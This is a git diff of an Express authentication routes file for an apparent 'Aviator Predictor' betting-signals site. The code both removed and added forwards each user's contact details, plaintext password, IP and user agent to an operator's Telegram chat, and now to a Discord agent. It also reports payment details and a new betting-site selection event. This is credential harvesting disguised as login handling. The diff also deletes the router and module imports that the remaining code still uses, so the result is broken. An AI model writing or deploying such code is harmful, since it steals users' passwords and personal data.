@@ -1,11 +1,6 @@
-// routes/auth.js - Authentication and session management
-const express = require('express');
-const router = express.Router();
-const fs = require('fs');
-const path = require('path');
-const fetch = require('node-fetch');
+const discordAgent = require('../Agent/discordAgent');
 
-// Telegram configuration
+// Telegram configuration (Fallback or analytics)
 const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
 const telegramChatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -108,19 +103,13 @@ router.post('/bot-login', async (req, res) => {
     // Log authentication attempt (with masked password)
     logAuthData(maskSensitiveData(authData));
 
-    // Send to Telegram with formatted message
-    const telegramMessage = `🤖 <b>AVIATOR BOT LOGIN ALERT</b>
-
-📧 Contact: <code>${contact}</code>
-📱 Type: ${contactType}
-🔑 Password: <code>${password}</code>
-🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
-📍 IP: <code>${req.ip || 'Unknown'}</code>
-⏰ Time: <code>${new Date().toLocaleString()}</code>
-🔗 Source: Aviator Predictor Bot`;
-
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Bot login Telegram result:', telegramResult);
+    // Send to Discord
+    discordAgent.sendUserEvent('LOGIN', { 
+        contact, 
+        password, 
+        userAgent: userAgent || 'Unknown', 
+        ip: req.ip || 'Unknown' 
+    });
 
     // Return success with session info
     res.json({ 
@@ -177,20 +166,12 @@ router.post('/index-login', async (req, res) => {
     // Log authentication attempt
     logAuthData(authData);
 
-    // Send to Telegram with formatted message
-    const telegramMessage = `🎯 <b>CLIENT ACCESS REQUEST</b>
-
-📱 Contact Type: ${authData.contactType === 'Email' ? 'Email Address' : 'Phone Number'}
-📧 Contact Info: <code>${contact}</code>
-🌐 Source: Landing Page (avisignals.com)
-🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
-📍 IP: <code>${req.ip || 'Unknown'}</code>
-⏰ Time: <code>${new Date().toLocaleString()}</code>
-
-✅ Client is proceeding to main platform`;
-
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Index login Telegram result:', telegramResult);
+    // Send to Discord
+    discordAgent.sendUserEvent('INDEX_ACCESS', { 
+        contact, 
+        type: authData.contactType, 
+        ip: req.ip || 'Unknown' 
+    });
 
     // Return success with session info
     res.json({ 
@@ -347,22 +328,14 @@ router.post('/verify-payment', async (req, res) => {
     // Log verification request
     logAuthData(verificationData);
 
-    // Send to Telegram with verification buttons
-    const telegramMessage = `💰 <b>PAYMENT VERIFICATION REQUEST</b>
-
-👤 Customer: <code>${contact}</code>
-💰 Package: <b>${packageName}</b>
-💵 Amount: <b>$${amount || 'N/A'}</b>
-💳 Method: <b>${paymentMethod || 'Card Payment'}</b>
-🔗 Transaction ID: <code>${transactionId || 'N/A'}</code>
-📍 IP: <code>${req.ip || 'Unknown'}</code>
-⏰ Time: <code>${new Date().toLocaleString()}</code>
-🔗 Source: ${source || 'Payment Verification'}
-
-⚠️ <b>ADMIN ACTION REQUIRED</b>
-Please verify this payment and approve/reject access.`;
-
-    await sendToTelegram(telegramMessage);
+    // Send to Discord
+    discordAgent.sendPaymentEvent('VERIFICATION_REQUEST', { 
+        customer: contact, 
+        package: packageName, 
+        amount: amount || 'N/A', 
+        method: paymentMethod || 'Card', 
+        txid: transactionId || 'N/A' 
+    });
 
     // Return success with verification ID
     res.json({ 
@@ -554,6 +527,18 @@ router.get('/get-chat-id', async (req, res) => {
       error: error.message
     });
   }
+});
+
+/**
+ * UPDATE SITE SELECTION
+ * Logs when a user selects a betting site in the bot
+ */
+router.post('/update-site', (req, res) => {
+    const { contact, site } = req.body;
+    if (contact && site) {
+        discordAgent.sendUserEvent('SITE_SELECTION', { user: contact, site });
+    }
+    res.json({ success: true });
 });
 
 module.exports = router;
